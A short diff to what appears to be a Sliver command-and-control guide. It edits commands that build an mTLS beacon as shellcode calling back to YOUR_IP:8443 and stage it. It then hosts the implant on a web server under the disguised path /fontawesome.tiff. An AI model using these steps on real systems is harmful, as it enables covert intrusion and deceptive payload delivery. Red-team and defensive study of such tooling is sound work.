@@ -31,12 +31,12 @@ profiles new --mtls YOUR_IP:8443 beacon --skip-symbols --format shellcode showto
 ```
 
 ```
-profiles stage showtoon -s fontawesome.tiff
+profiles stage showtoon -s shellcode.bin
 ```
 
 Add implant to http server
 ```
-websites add-content --content /fontawesome.tiff --web-path /fontawesome.tiff --website test
+websites add-content --content shellcode.bin --web-path /fontawesome.tiff --website test
 ```
 
 Host the implant
